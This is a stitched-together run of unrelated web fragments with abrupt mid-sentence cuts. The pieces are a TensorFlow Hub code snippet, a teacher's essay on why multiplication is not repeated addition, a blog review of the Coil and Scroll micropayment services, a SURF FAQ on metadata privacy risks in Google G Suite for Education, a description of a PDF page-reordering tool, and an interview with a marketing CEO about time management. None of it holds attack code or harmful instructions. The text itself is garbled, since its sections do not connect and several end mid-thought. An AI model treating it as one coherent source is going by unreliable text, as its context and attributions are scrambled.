<p>It’s worth mentioning that Keras applications are not your only option for transfer learning tasks. You can also use models from <a href="https://www.tensorflow.org/hub" target="_blank" rel="noreferrer noopener nofollow"><strong>TensorFlow Hub</strong></a>.</p>



<pre>model = tf.keras.Sequential([
 hub.KerasLayer(<span>"https://tfhub.dev/google/imagenet/mobilenet_v2_100_224/feature_vector/4"</span>,
                   trainable=<span>False</span>), 
    tf.keras.layers.Dense(num_classes, activation=<span>'softmax'</span>)
])</pre>



<h4>Pretrained word embeddings</h4>



<p><strong>Word embeddings </strong>are usually used for text classification problems. In as much as you can train your word embeddings, using a pre-trained one is much quicker. Here are a couple of word embeddings that you can consider for your natural language processing problems:</p>

Yet the discussion feels incomplete — I have not been able to put into words all that I want to say. Thus, at the risk of once again revealing my <a href="http://letsplaymath.net/2007/01/31/confession-i-am-not-good-at-math/">mathematical ignorance</a>, I am going to try another response to Keith Devlin’s <a href="http://www.maa.org/external_archive/devlin/devlin_06_08.html">multiplication</a> <a href="http://www.maa.org/external_archive/devlin/devlin_0708_08.html">articles</a>.</p>
<p>Let me state up front that I speak as a teacher, not as a mathematician. I am not qualified, nor do I intend, to argue about the implications of <a href="http://mathworld.wolfram.com/PeanosAxioms.html">Peano’s Axioms</a>. My experience lies primarily in teaching K-10, from elementary arithmetic through basic algebra and geometry. I remember only snippets of my college math classes, back in the days when we worried more about nuclear winter than global warming.</p>
<p>I will start with a few things we can all agree on…</p>

<h2>We All Agree on Some Things</h2>
<ul>
<li><strong>Elementary students will use addition</strong> to solve beginning multiplication problems. What else could they do? They have not yet learned multiplication.</li>
</ul>
<ul>
<li><strong>The multiplication table is initially built by repeated addition</strong>, as our students add up (or count by) the numbers in each row and column. Even adults, when they get stumped by a math fact they’ve forgotten, will use repeated addition to figure out the answer.</li>
</ul>
<ul>
<li><strong>Repeated addition does give the correct answer</strong> for any multiplication of whole numbers. Sometimes it is more trouble than it is worth — who wants to add up 957×842? But by using the Distributive Property, any multiplication of whole numbers can be reduced to a repeated addition calculation:<br>
4 ×&nbsp;3 = (1 + 1 + 1 + 1) ×&nbsp;3 = 3 + 3 + 3 + 3</li>
</ul>
<ul>
<li><strong>Rational number multiplications can be calculated as addition of parts.</strong> This is how the Egyptian scribes handled multiplication of fractions. But be careful! To calculate the parts, one needs multiplication — or rather, its inverse, division. So to use this as a definition, one must resort to circular reasoning.</li>
</ul>
<ul>
<li><strong>Finally, I think we can all agree that repeated addition is an important problem-solving tool.</strong> Repeated addition can help students think their way through simple multiplication word problems. It doesn’t always work, but sometimes it is the quickest way to understand a situation.</li>
</ul>
<h2>So What’s the Problem?</h2>
<p>So what is wrong with the definition, “Multiplication is repeated addition”? Perhaps <em>wrong</em> is too strong a word — perhaps in some deep, theoretical sense, the statement is true, at least for the whole numbers — I’ll leave that argument to the mathematicians. (See, for instance, <a href="http://devlinsangle.blogspot.com/2011/11/how-multiplication-is-really-defined-in.html" title="How multiplication is really defined in Peano arithmetic">How multiplication is really defined in Peano arithmetic</a>.) But speaking as a teacher, the phrase can definitely be misleading.</p>
<blockquote><p>To define multiplication as repeated addition is to make multiplication a sub-species of addition.</p></blockquote>
<p>It is as if there were two types of addition: regular, random, “wild” addition and the specially-bred variety of addition to which we give the name <em>multiplication</em>. Is that really how we want our students to think? Multiplication is not a mere sub-species of addition. Multiplication is its own animal, an independent operation.</p>
<ul>
<li>The operation of addition has its <a href="http://www.answers.com/topic/identity-element">identity element</a>. </li>
<li>The operation of multiplication has its <a href="http://mathforum.org/library/drmath/view/56032.html">identity element</a>.</li>
</ul>
<p>And they are not the same. </p>
<ul>
<li>Every number has its own <a href="http://www.mathwords.com/a/additive_inverse_number.htm">additive inverse</a>. </li>
<li>Each number has a <a href="http://www.mathwords.com/m/multiplicative_inverse_of_a_number.htm">multiplicative inverse</a>, too.</li>
</ul>
<p>And they are not the same. </p>
<ul>
<li>Addition has its inverse operation, <a href="http://www.aaastudy.com/pro34bx2.htm">subtraction</a>.</li>
<li>Multiplication has its inverse operation, <a href="http://www.aaastudy.com/pro34cx2.htm">division</a>. </li>
</ul>
<p>And they are not the same, because the operations are not the same.</p>
<p>[Sidetrack: Oops! I forgot that zero does not have a multiplicative inverse. <a href="http://mathforum.org/kb/message.jspa?messageID=7002833&amp;tstart=0">Jonathan</a> pointed out my mistake.]</p>
<p>[Another side note: I find it interesting that repeated subtraction can be a useful tool in solving some division problems, just as repeated addition can be a useful tool in understanding multiplication. Subtraction plays an important role in the <a href="https://denisegaskins.com/2010/04/12/the-cookie-factory-guide-to-long-division/">algorithm for long division</a>. I suppose someone will argue that this is evidence multiplication is repeated addition after all.]</p>
<h2>Dimensional Reasoning</h2>
<p><a href="http://encyclopedia.thefreedictionary.com/Dimensional+analysis">Dimensional analysis</a> means looking at the dimensions (units of measurement) of a quantity to help you solve a science or engineering problem.</p>
<p><strong>Addition requires identical units.</strong> The sum must always have the same units as the addends:</p>
<p>2 apples + 3 apples = 5 apples</p>
<p>2 apples + 3 oranges = ?? </p>
<p>What does that second equation give you? Fruit salad? In order to add quantities with unlike units, we need to find a <a href="http://www.thefreedictionary.com/common+denominator">common denominator</a>. Apples and oranges are both pieces of fruit, so…</p>
<p>2 apples + 3 oranges =</p>
<p>2 pieces of fruit + 3 pieces of fruit = 5 pieces of fruit </p>
<p><strong>Multiplication requires different units.</strong> The product does not have the same units as either the multiplier or the multiplicand.</p>
<p>2 baskets ×&nbsp;3 apples per basket  = 6 apples </p>
<p>How can we make multiplication come out the same as repeated addition? The only way to do it is to change the units.</p>
<p>3 cm + 3 cm = 6 cm </p>
<p>But…</p>
<p>2 cm ×&nbsp;3 cm = 6 cm<sup>2</sup> </p>
<p>We need…</p>
<p>2 lengths ×&nbsp;3 cm per length = 6 cm</p>
<p>We do not normally think about dimensional analysis when we work with plain numbers in math class. But the fact remains that <em>multiplication changes things in a way that addition does not</em>. </p>
<blockquote><p>Addition is one-dimensional, but multiplication is multi-dimensional.</p></blockquote>
<p>This is why the rules for fraction addition and fraction multiplication are so different. When you add positive rational numbers, you always get a sum that is bigger than either addend. But when you multiply rational numbers, all bets are off — the product may be bigger, smaller, or somewhere in between the numbers.</p>
<h2>Language Does Matter</h2>
<p><strong>Addition:</strong> addend + addend = sum. The addends are interchangeable. This is represented by the fact that they have the same name.</p>
<p><strong>Multiplication:</strong> multiplier ×&nbsp;multiplicand = product. The multiplier and multiplicand have different names, even though many of us have trouble remembering which is which. </p>
<ul>
<li><strong>multiplier</strong> = “how many or how much”</li>
<li><strong>multiplicand</strong> = the size of the “unit” or “group”</li>
</ul>
<p><em>Different names indicate a difference in function.</em> The multiplier and the multiplicand are not conceptually interchangeable. It is true that multiplication is <a href="http://mathworld.wolfram.com/Commutative.html">commutative</a>, but (2&nbsp;rows ×&nbsp;3&nbsp;chairs/row) is not the same as (3&nbsp;rows ×&nbsp;2&nbsp;chairs/row), even though both sets contain 6&nbsp;chairs.</p>
<h2>A New Type of Number</h2>
<p>In multiplication, we introduce a totally new type of number: the <em>multiplicand.</em> A strange, new concept sits at the heart of multiplication, something students have never seen before.</p>
<p>The multiplicand is a this-per-that ratio.</p>
<p>A ratio is a not a counting number, but something new, much more abstract than anything the students have seen up to this point. </p>
<p>A ratio is a relationship number.</p>
<p>In addition and subtraction, numbers count how much stuff you have. If you get more stuff, the numbers get bigger. If you lose some of the stuff, the numbers get smaller. Numbers measure the amount of cookies, horses, dollars, gasoline, or whatever.</p>
<p>The multiplicand doesn’t count the number of dollars or measure the volume of gasoline. It tells the relationship between them, the dollars per gallon, which <em>stays the same whether you buy a lot or a little.</em> </p>
<blockquote><p>By telling our students that “multiplication is repeated addition,” we dismiss the importance of the multiplicand. But until our students wrestle with and come to understand the concept of ratio, they can never fully understand multiplication.</p></blockquote>
<h2>How Then Shall We Teach?</h2>
<p>If we accept this argument, if we agree to no longer define basic multiplication as repeated addition, then what? How does that affect the way we teach?</p>
<p>Mainly, we need to change our focus from <strong>how</strong> to <strong>why</strong>.</p>
<p>We can teach multiplication in much the same way that we do now, using manipulatives arranged in groups or rows, pictures of multiplication situations, and rectangular arrays of dots or blocks. But instead of drawing our student’s attention to the <em>process</em> of adding up the answer, we want to focus on the fact that the items are arranged in <em>equal sized groups</em>. </p>
<p>In other words, we teach our students to recognize the multiplicand: </p>
<ul>
<li>Teach children the useful word “per” and how to recognize a “this per that” unit. </li>
<li>Have them label the quantities in their workbook: 3 cookies per student, 5 flowers per vase, 1 eye per alien, or whatever.</li>
</ul>
<p>If we need a simple, elementary-level catchphrase to replace “multiplication is repeated addition,” how about this? </p>
<blockquote><p><strong>Multiplication is counting by this-per-that groups.</strong></p></blockquote>
<p>As with any such phrase, this statement fails to capture all that multiplication entails. The definition will have to be expanded as students learn about rational numbers. “Oh, look! We can count just part of a group, and we can measure with a unit that is not a whole number.” Our students will someday have to learn about real numbers, complex numbers, and matrix multiplication. Even so, the phrase captures an important aspect of many multiplication situations our students will meet in K-12: that there is a multiplicand, some “this per that” quantity.</p>
<p>This approach should be especially helpful to those frustrating students — you know, the ones with the blank stare — who read a word problem and then ask, “Do I add or multiply?”</p>
<h2>A Useful Tool</h2>
<p>Completing the circle, I come back to the point of <a href="http://letsplaymath.net/2008/07/01/if-it-aint-repeated-addition/">my first “repeated addition” post</a>. I would like you to consider the teaching power of bar model diagrams to represent arithmetic operations. These diagrams are used in the <a href="http://www.singaporemath.com/Primary_Mathematics_US_Ed_s/39.htm">Singapore Primary Math</a> books, and according to <a href="http://letsplaymath.net/2007/09/02/pre-algebra-problem-solving-2nd-grade/#comment-12305">one commenter</a> they are popular in Russia and Australia. They are even beginning to show up in newer American textbooks, where they are sometimes called “tape diagrams.” </p>
<p>Here are some advantages of the bar diagram model:</p>
<ul>
<li>Bar diagrams chunkify the number line and make number relationships less abstract. </li>
</ul>
<ul>
<li>They provide elementary students with a pictorial algebra that can help them think through complicated word problems. </li>
</ul>
<ul>
<li>It is easy for students to see the inverse relationship between addition and subtraction, or between multiplication and division. </li>
</ul>
<ul>
<li>Because …</li></ul></div></div>

March 3, 2021 | https://sammorrowdrums.com/going-ad-free-with-micropayments | <a href="https://web.archive.org/web/*/https://sammorrowdrums.com/going-ad-free-with-micropayments">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Having recently decided that I was fed up with seeing ads and paywalls on countless websites every time I open links (on news sites in particular), while still wanting content producers to get payed, I felt I needed to look into options for micropayments and see if they are any good. I simply won't subscribe to sites for which I am only a casual reader, so I needed another option.</p>

<p><img src="https://i.snap.as/dMP9PflY.png" alt="Scroll payment breakdown"></p>

<p>There are actually now several micropayment providers, and Mozilla seem to be very motivated to help push the field forwards<a href="https://hacks.mozilla.org/2020/03/web-monetization-coil-and-firefox-reality/" rel="nofollow">1</a>, <a href="https://firstlook.firefox.com/betterweb/" rel="nofollow">2</a>. Interestingly JavaScript pioneer and Mozilla co-founder <a href="https://en.wikipedia.org/wiki/Brendan_Eich" rel="nofollow">Brendan Eich</a>, is also one of the pioneers of micropayment systems with <a href="https://brave.com/" rel="nofollow">Brave web browser</a> and their <a href="https://brave.com/brave-rewards/" rel="nofollow">Basic Attention Token</a> system. Unfortunately, I ruled out Brave early on because:</p>
<ul><li>There are numerous accusations of dubious activity such as:
<ul><li><a href="https://www.theverge.com/2020/6/8/21283769/brave-browser-affiliate-links-crypto-privacy-ceo-apology" rel="nofollow">Inserting affiliate links</a></li>
<li><a href="https://www.wired.com/2016/04/brave-software-publishers-respond/" rel="nofollow">They tried blocking ads, but then injecting their own</a>
<ul><li><strong>UPDATE</strong> Apparently this is a widely held misconception, <a href="https://news.ycombinator.com/item?id=18744481" rel="nofollow">here</a> is some more conversation around it.</li></ul></li>
<li><a href="https://news.ycombinator.com/item?id=18734999" rel="nofollow">Taking tips for people without consent</a></li>
<li><a href="https://www.coindesk.com/brave-browser-leak-exposed-user-domain-info-months" rel="nofollow">Including Tor, but Leaking DNS</a>, which is now fixed but a false sense of security is a dangerous thing</li></ul></li>
<li>I'm not convinced by Basic Attention Token and tips implementation, nor chances of mass adoption of Brave for their system to get enough market share to succeed.</li>
<li>I want to choose what browser I use – and still be able to read monetized content without ads.</li></ul>

<p>So that left me mostly with the two services Mozilla is working with, <a href="https://coil.com/" rel="nofollow">Coil</a> and <a href="https://scroll.com/" rel="nofollow">Scroll</a>. Here is a basic breakdown:</p>
<ul><li>Coil
<ul><li>$5/month</li>
<li>Works with browser plugins</li>
<li>Pays out continuously based on time spent on site / watching content</li>
<li>On mobile requires <a href="https://www.pumabrowser.com/" rel="nofollow">Puma browser</a> (due to lack of plugin integration in mobile browsers), which is basically Firefox Mobile + Coil support</li>
<li>Uses open <a href="https://interledger.org/" rel="nofollow">interledger</a> protocol:
<ul><li>To monetize your own content, just add an HTML tag (or if doing conditional ads, you can do a small bit of JS to check).</li>
<li>Paying out goes to any wallet provider that supports the protocol, I use <a href="https://uphold.com/" rel="nofollow">Uphold</a> for my blog, which can pay out in Fiat currency</li>
<li>Other providers than coil can emerge and use the same protocol</li></ul></li>
<li>Enables various other kinds of Monetization, so can be used with Twitch, Imgur, Newgrounds and all kinds of other services.</li>
<li>Coil doesn't have to pre-approve monetized content providers</li></ul></li>
<li>Scroll
<ul><li>$5/month</li>
<li>Works with browser cookie as far as I can tell</li>
<li>Pays out to its partners as a split share of your subscription fee</li>
<li>Works on basically all browsers (but you might not notice if you get signed out at first, from clearing cache for example)</li>
<li>Does deals with specific content providers, such as The Atlantic and Bloomberg.</li>
<li>Centralised payment system, officially only available in USA currently
</li></ul></li></ul>

<h2 id="using-coil">Using Coil</h2>

<p><img src="https://i.snap.as/HBt9YM2z.png" alt="Coil Homepage"></p>

<p>Coil was very easy to set up. Just sign-up,  grab the browser extensions and go. Then you can see a little green dollar sign when you visit pages that take payments. Unfortunately we don't have the ability (yet) to add the extension to mobile browsers, so in order to benefit from Coil on mobile I needed to install Puma Browser (effectively Firefox Mobile). Which, after a while of delaying I eventually decided to do. My one gripe was that neither LastPass nor 1Password currently recognize it as a browser, so it couldn't fully replace my mobile browser (yet), as they would offer to add passwords for the entire app rather than just the page you were on  – I did flag this with 1Password.</p>

<p>I am very happy with the service Coil provides (including their <a href="https://coil.com/explore" rel="nofollow">curated list</a> of monetized sites). I find that the broad range of independent publishers it supports makes it an incredibly viable option. The open protocol in particular should enable future iterations, competitors and support from more financial institutions over time, and it seems like its biggest perk is it is decentralized, and so I was able to experiment with the other side of the coin with ease.</p>

<p>With my blogging provider <a href="https://write.as/" rel="nofollow">Write.As</a>, I was able to instantly try out monetizing my own content. I just needed to add my “interledger payment pointer”, which I obtained via <a href="https://uphold.com/" rel="nofollow">Uphold</a> to automatically pay out in Euros.</p>

<p>Now, before getting excited, my low volume blog does not make any real money. Here's how it's gone so far:</p>

<p><img src="https://i.snap.as/GsnyTHdQ.png" alt="My uphold wallet balance"></p>

<p>But, I am hopeful should I write anything of consequence and should more people start using Coil, I would end up getting payed a much greater amount. I'd be interested to see how the more commercial partners are doing.</p>



<p><img src="https://i.snap.as/eSKZyL15.png" alt="Scroll Homepage"></p>

<p>So after my positive experience with Coil, I decided to give Scroll a go. It is interesting, because while it doesn't have the open tech appeal of Coil, it does remove ads and has some serious premium content providers signed up to it, although sadly some of them still have article limits before you would still have to subscribe.</p>

<p>Coil uses magic SSO links via their interface and to your email, so it is really simple to get going. Click on the links in your browsers of choice, and you are already set up. They also show a breakdown of which partners are getting a cut of your subscription (and how much of it they get).</p>

<p><img src="https://i.snap.as/dMP9PflY.png" alt="Scroll payment breakdown"></p>

<p>You can tell that it is working on participating sites because you get a small S symbol on-screen, which you can open to the Scroll toolbar, which enables you to do things such as share ad free links, and also it gives visual confirmation that you are indeed signed in.</p>

<p>My only problem (other than questions about the centralized model), is that Scroll gets logged out when you clear your browser cache etc. and I don't know what their plan is (and if it will continue to work the same way once browsers crack down further on cookies). So I have found myself logged out a few times, and then need to input my email and get a link to back log in again. It's only a mild annoyance, but it is true that it has been more awkward to use in the long run compared to Coil (which was more a set up once, work forever kind of thing).</p>

<h2 id="conclusion">Conclusion</h2>

<p>I think the world of micropayment funded content is finally beginning to mature, and “experiments” in the field are getting more and more thought out, and I expect to see these services continue to expand significantly  over the next few years. I cannot predict if the day of micropayments is here, and I know that globally $5/month to two main providers is cheap in some places, and unimaginable in others, but the nice part with Coil, is that people in places that are less wealthy can easily get set up to monetize content, and hopefully that will democratize media a little bit more – while also providing alternatives to established ad-based media.</p>

<p>There are also further questions to be asked, like the implications of society being desensitized to automatically paying out small sums of money all the time, and potential for accidentally paying money to people you wouldn't want to (even if there were ads doing it before anyway). It is also interesting what impact this has on privacy / tracking – and micropayment providers knowing what content you are looking at. I certainly hope that none of these businesses evolve to monetize your user data, as that is exactly the opposite of what I'm paying them to do. I also wonder about children and people unable to pay, and if we are just locking them out of ad-free experiences – which I would consider to be a dark outcome. Will it also make ad-funded stuff less viable – as more places stop relying on ads and use this instead? I certainly hope so.</p>

<p>I am very happy with my micropayment experience so far, and I intend to continue to use both Scroll and Coil for at least the next year, and I definitely feel a bit better not seeing ads this way, rather than simply applying an ad-blocker with no alternative funding for content producers. If you are willing to, I'd recommend giving it a try for yourself and experiencing the warm feeling of giving something back when reading something you have enjoyed, without the cursed tracking cookies and ads slowing loading and interrupting your experience.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
  <div>
    
    
            <div><p><strong>In the education sector, personal and other privacy-sensitive data are digitally stored and exchanged at an increasing rate. It is important this is done in a safe and responsible manner. An investigation commissioned by the University of Groningen (RUG) and the Amsterdam University of Applied Sciences (HvA) has shown there are privacy risks associated with the use of Google’s G Suite*.</strong></p>
<p>These risks are associated with the so-called metadata Google collects. SURF and SIVON have supported this investigation into privacy risks and are currently, on behalf of the education sector, in negotiations with Google to ensure these privacy risks are eliminated.</p>
</div>
      
  </div>
  </div><div>
          
            <div><p>The privacy risks were revealed by a so-called Data Protection Impact Assessment (DPIA) on Google’s G Suite. A DPIA provides insights into the way data is collected, what is done with it, and what risks are associated with collection. The Dutch Ministry of Justice and Security had the DPIA carried out for the G Suite Enterprise version, the RUG and HvA had an investigation carried out on G Suite Education.</p>
<h2>Metadata</h2>
<p>Google collects metadata, for example, about the use of Google G Suite. With this data, Google can see what users click on most often, how long they are logged in for, what internet pages are used most, and what search queries are carried out most. This is, therefore, not a case of individual learning results or user’s address data.</p>
<h2>Risks</h2>
<p>Google regards itself a data controller rather than a processor. This means Google considers itself entitled to determine the purpose of the collection of metadata and the manner in which this is done. Moreover, Google states in their privacy agreements that they may unilaterally change the conditions surrounding the collection of metadata, without asking for [users’] permission.&nbsp;</p>
<p>For applications in educational institutions, we find it undesirable that the ownership and responsibility for this data lies with Google. As a result, educational institutions using Google G Suite have little to no control over what happens with their data, creating a potential risk for the future. For example, if this metadata is being used to place personalised advertising.</p>
<h2>Follow-up steps</h2>
<p>Currently, there is no agreement with Google in place surrounding the practices on collecting metadata and we are still discussing the indicated improvement points with them. We will also be submitting a request for advice about these privacy risks to the Dutch Data Protection Authority. We assume Google will make changes so the identified risks will be removed and education institutions can continue to use G Suite for Education safely.</p>
<p><em>* G Suite for Education was recently renamed Google Workspace for Education. Google Workspace for Education includes Classroom, Meet, Gmail, Calendar, Drive, Docs, Sheets, Slides and more.</em></p>
</div>
      
      </div><div>
      <p><span>What products does Google G Suite for Education contain and what is Google Workspace for Education?</span></p><div>
            <div><p>Google G Suite for Education includes: Classroom, Meet, Gmail, Calendar, Drive, Docs, Sheets, Slides, and more. Google G Suite for Education has &nbsp;recently been renamed Google Workspace for Education.</p>
<p>The complete list of applications: Google Classroom, Chat, Meet, Hangouts, Contacts, Tasks, Keep, Drive, Calendar, Jamboard, Sites, Forms, Sheets, Docs, Slides, Assignments, Cloud search and retrieval across services, Vault, Gmail, Cloud identity management</p>

  </div><div>
      <p><span>What is a DPIA?</span></p><div>
            <p>A DPIA (Data Protection Impact Assessment) provides insights into the way data is collected, what is done with it, and what risks are associated with collection. When a DPIA is completed, measures can be put in place to reduce the risks.</p>
      </div>
  </div><div>
      <p><span>Why has a DPIA of Google G Suite been done?</span></p><div>
            <p>The DPIA was carried out in order to identify potential privacy risks of Google G Suite for Education when used by educational institutions. With the outcomes of the DPIA, we were able determine what measures need to be taken to limit those risks.</p>
      </div>
  </div><div>
      <p><span>What are the outcomes of the DPIA?</span></p><div>
            <p>The outcome of the DPIAs has shown there are privacy risks associated with the use of Google G Suite (Enterprise) for Education. Google has therefore amended their privacy conditions on a number of points. However, risks still remain in place. The DPIA also has shown that so-called ‘metadata’ is collected. Metadata remotely measures whether and how users use applications. This data is sent to the supplier of the software and for example, concerns the moment of login by users, what internet pages are visited, how long a document is being worked on, or how many words are being typed. Google still regards itself a controller of some of the data collected, rather than a processor. This means Google considers itself entitled to determine the purpose of the collection of metadata, as well as the manner in which this is done. Moreover, Google is not transparent about their data collection and processing practices. As a result, educational institutions using Google G Suite have little to no control over what happens with their data.</p>
      </div>
  </div><div>
      <p><span>What happens next?</span></p><div>
            <p>On behalf of the education sector, SURF and SIVON are in discussion with Google to resolve the privacy risks identified regarding the use of metadata. At the moment, Google has not yet implemented all changes the education sector requires. SURF and SIVON will submit a request for advice to the Dutch Data Protection Authority (AP). The AP is expected to deliver an assessment of the privacy risks identified.</p>
      </div>
  </div><div>
      <p><span>What happens if Google does not  resolve the privacy risks?</span></p><div>
            <p>We assume Google will make changes so the identified risks will be resolved.</p>
      </div>
  </div><div>
      <p><span>Should educational institutions stop using Google immediately? </span></p><div>
            <div><p>No, we believe there is a problem that needs to and can be solved. We assume Google will make the necessary adjustments. The current situation does not mean that schools and educational institutions should stop using Google G Suite at once, especially if they depend on it for the continuity of their education. The discussions with Google regarding changes to their policy are ongoing and the Dutch Data Protection Authority has also been asked to issue an advice.</p>
<p>We advise institutions that are currently considering implementing the use Google, to temporarily halt these plans until further notice.</p>
</div>
      </div>
  </div><div>
      <p><span>What changes has Google made as a result of the DPIA?</span></p><div>
            <p>It has been agreed with Google that they will communicate more clearly about the use of user data, including about the processing of metadata they collect. When using G Suite for Education, Google will put in place measures for logging in with a private account in the institutional environment, so personal information and institutional information are not mixed. Users will also be able to block access to "additional services", such as YouTube, for their institutional account.</p>
      </div>
  </div><div>
      <p><span>How do I know whether my institution has purchased the Google G Suite for education service via SURF?</span></p><div>
            <p>SURF has not had an agreement with Google for years. Only since very recently, there is the possibility to purchase G Suite via OCRE. Institutions have not yet made use of this option.</p>
      </div>
  </div><div>
      <p><span>If my institution still has a direct contract with Google for this service, can SURF take over this contract and ensure  the DPIA requirements are met?</span></p><div>
            <p>That depends on your institution's current agreements with Google. We are not in a position to make general assumptions about individual situations. Please contact your SURF relationship manager if you have any questions.</p>
      </div>
  </div><div>
      <p><span>What is the impact of the DPIA on other Google services currently on offer through OCRE?</span></p><div>
            <p>The DPIA that is completed, was specifically aimed at G Suite. Other Google solutions have not been tested at this point. As such, we cannot (yet) state with certainty whether these solutions comply or not. It is up to the institution to weigh up the pros and cons of their use and, above all, to consult their Data Protection Officer (FG). We do advise to proceed with caution when entering into new contracts.</p>
      </div>
  </div><div>
      <p><span>Within my institution we cannot simply switch to another service; what does SURF advise for these  situations?</span></p><div>
            <p>Currently, there is a problem that needs to be solved, and we assume Google will make the necessary adjustments to resolved these problems. The current situation does not mean the education sector should stop using Google G Suite immediately or all together, especially if they depend on it for the continuity of their education. The Dutch Data Protection Authority (Autoriteit Persoonsgegevens) has been asked to provide advice on this, and talks with Google about their policy are ongoing. We advise institutions considering using Google to take the results of this DPIA into account when making decisions.</p>
      </div>
  </div><div>
      <p><span>Do these privacy risks also apply to Microsoft/O365?</span></p><div>
            <p>Similar DPIAs have been&nbsp; carried out for Microsoft products and services two years ago. As a result, at the time, additional arrangements have been made with Microsoft. The final conclusion of these DPIAs was that the use of Microsoft products does not involve high risks, provided that the customer takes a number of measures.</p>
      </div>
  </div><div>
      <p><span>I have a question or comment I do not wish to discuss publicly. Who should I contact?</span></p><div>
            <p>If your question is not answered on this page, please contact your SURF relationship manager.</p>
      </div>
  </div><div>
      <p><span>SURF does not offer a contract with Google. Why is SURF involved in this?</span></p><div>
            <p>At the request of the Amsterdam University of Applied Sciences (HvA) and the University of Groningen (RUG), SURF has been involved in this process since May 2020. SURF has been involved as this matter is of …</p></div></div></div>

<p>What you see above is a tool to reorder the pages of a PDF file, into the order as described by Brent Yorgey <a href="https://mathlesstraveled.com/2016/01/08/a-new-way-to-read-and-print-double-sided-paper/">here</a> (called “Möbius double-sided printing” <a href="https://byorgey.wordpress.com/how-to-print-things/#m%C3%B6bius-double-sided">here</a>). Basically, it reorders the <i>n</i> pages [1, 2, …, <i>n</i>] of a PDF file into the order [1, <i>m</i>+1, 2, <i>m</i>+2, 3, <i>m</i>+3, … <i>m</i>, 2<i>m</i>], where <i>m</i> = ⌈<i>n</i>/2⌉, and the final page 2<i>m</i> is omitted if it doesn't exist (i.e., if <i>n</i> is odd).</p>

<p>To use this tool, just upload a PDF file above, then click on the link to download a new PDF file with reordered pages.</p>


<p><i>(In short, so that it requires less mental effort to turn pages, and so that it's easier to look at the next/previous page(s) simultaneously. It's explained by Brent Yorgey on the two pages mentioned above; reproducing part of the explanation here along with his illustrations.)</i></p>

<p>Consider the standard/default method of two-sided printing: for a document with 8 pages, the result looks like:</p>

    <li><p>When you're done reading a certain page, the way to proceed to the next page is the same regardless of whether you're on an odd-numbered page or an even-numbered page: you don't have to remember, and so at page boundaries you don't have to shift your attention from the contents of what you're reading to figuring out page mechanics. What you do is always the same, namely flip the current sheet of paper and move it to the bottom of the stack:</p>

    <li>When the text refers to the previous or the next page, you can always very easily look at that page or put it adjacent to the current one (so you can see both at once), which with the standard method is impossible when an odd-numbered page refers to its next page or an even-numbered page refers to its previous one. Also, if you just want to glance at the previous page, there is never any page flipping required: just twist your wrist and look at the bottom of the stack. (This is my main reason for preferring this method over the minor variant he calls “Two-way double-sided”.)</li>

<p>The code rearranges pages using <a href="https://pdf-lib.js.org/">pdf-lib</a> (<a href="https://github.com/Hopding/pdf-lib">GitHub</a>) (v1.3.0) by Andrew Dillon. I tried to use Mozilla's PDF.js, but its documentation on these “core” matters (as opposed to just rendering a PDF in a canvas or whatever) seems poor/nonexistent compared to pdf-lib, which is excellent.</p>

<p>The idea of printing documents in this way, and the analysis and pictures above, are due to Brent Yorgey (<a href="https://mathlesstraveled.com/2016/01/08/a-new-way-to-read-and-print-double-sided-paper/">here</a> and <a href="https://byorgey.wordpress.com/how-to-print-things/#m%C3%B6bius-double-sided">here</a>, as mentioned).</p>

In his opinion, working before the kids leave for school is calling for frustration for the rest of the day.</p><p>Yet, in the end, when asked about what would he do if he had 1 extra hour in the day, he held up the coffee mug on his table with pictures of his 3 kids and wife and said, “I’ll rock with them!”.</p><figure><img src="https://blog.mailmanhq.com/content/images/2021/02/scrnli_2_13_2021_8-11-56-PM.png" alt="" srcset="https://blog.mailmanhq.com/content/images/size/w600/2021/02/scrnli_2_13_2021_8-11-56-PM.png 600w, https://blog.mailmanhq.com/content/images/2021/02/scrnli_2_13_2021_8-11-56-PM.png 968w"><figcaption>Brett Farmiloe and his favorite mug</figcaption></figure><p>For most parents, this is how time management works. The kids, their requirements and then planning their workday around that.</p><p>But in the case of Brett, he's not just a father of 3 but the CEO of ~15 person marketing company AND launching another startup. So besides running a family, he's also responsible for running and growing a business and starting a new one too.</p><div><p>If you're thinking Brett would be struggling to manage all of those things? </p><p>I’m afraid, you're wrong.</p></div><p>That's what blew me away! Frankly, at the end of my conversation with him I felt it would actually be easy for him to manage all those things with the several concepts, principles and tools that he uses to guard and make the most of his time.</p><p>One key learning that I took away from him is how he reflects back on the tasks that he didn't accomplish by the assigned deadline. He re-analyzes if those tasks were really important enough or could they just be delegated or completely ignored. Instead of, you know, feeling guilty and crying wet tears over them. I mean that’s what I do at least. Unlike Brett, who does this whole re-analysis to help him make better time allocation decisions in future.</p><p>That's just one of the many useful techniques, concepts, tools he shared in our entire conversation. It's almost like a mini-productivity course if you read it through.</p><p>Let's dive straight in!</p><blockquote>If you like this blog post, please take a minute to share it around. <a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fblog.mailmanhq.com%2Fbrett-farmiloe-markitors%2F&amp;via=Mailman_HQ%20%40mohitmamoria&amp;text=Brett%20Farmiloe%20-%20CEO%20with%203%20kids%20and%202%20businesses%20to%20run%21">Click here to get an auto-populated tweet</a>.</blockquote><h3 id="brett-introduces-himself">Brett introduces himself</h3><p>Hi I’m Brett Farmiloe. Father of 3, CEO of <a href="https://markitors.com/">Markitors</a>, an SEO company for small businesses and I’m also launching a startup that’s considered a knowledge network (terkel.io). Balancing all of those things is basically what I try to do everyday.</p><h3 id="what-is-a-knowledge-network">What is a knowledge network?</h3><div><p>The knowledge network I’m building is called <a href="https://terkel.io/">Terkel</a>. Panelists can go in, answer questions from their area of expertise and get published. Sharing your knowledge is the best way to promote your small business.</p><p>It was born out of the fact that our SEO company was turning away 9 out of 10 leads as they didn’t meet certain criteria for us to develop a positive ROI for them. So we created this knowledge network where these small businesses could still participate, get value and build some brand authority for their website, so that eventually they can be a good client for us.</p></div><h3 id="how-brett-started-his-business">How Brett started his business?</h3><div><p>I started Markitors as a freelancer, had a bunch of clients. I was having a really good time, I was &nbsp;traveling around the world doing marketing and it was great. Then I got my website to rank at #1 in google search results. If you google the term “Digital marketing company” anywhere in the United States, you would find markitors.com on top, and then when you call the phone it’d just be me hangin’ out in my daughter’s bedroom. People would say, ”hey tell me about your company” and I’d go,” well it’s just me”. That inspired to actually go ahead and start a company and now we’ve got around 15 employees.</p><p>The thing that has recurred time and time again for the past decade or so is this notion that help is very hard to find in digital marketing. Small business owners have this aspiration or dream for their 